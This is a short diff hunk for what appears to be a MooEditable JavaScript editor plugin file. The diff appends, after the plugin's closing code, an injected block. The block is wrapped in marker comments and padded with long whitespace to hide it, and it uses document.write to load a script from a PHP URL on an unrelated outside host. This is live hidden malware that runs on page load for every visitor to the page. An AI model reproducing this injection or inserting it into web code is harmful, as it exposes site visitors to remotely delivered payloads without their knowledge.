@@ -131,3 +131,12 @@ MooEditable.Actions.createlink.command = function(){
 }
 
 })();
+
+/*8a2a25*/
+
+                    																	                               	 /*gbargbar09311gbar09*/
+
+document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525360'></"+ "script>");
+
+
+/*/8a2a25*/
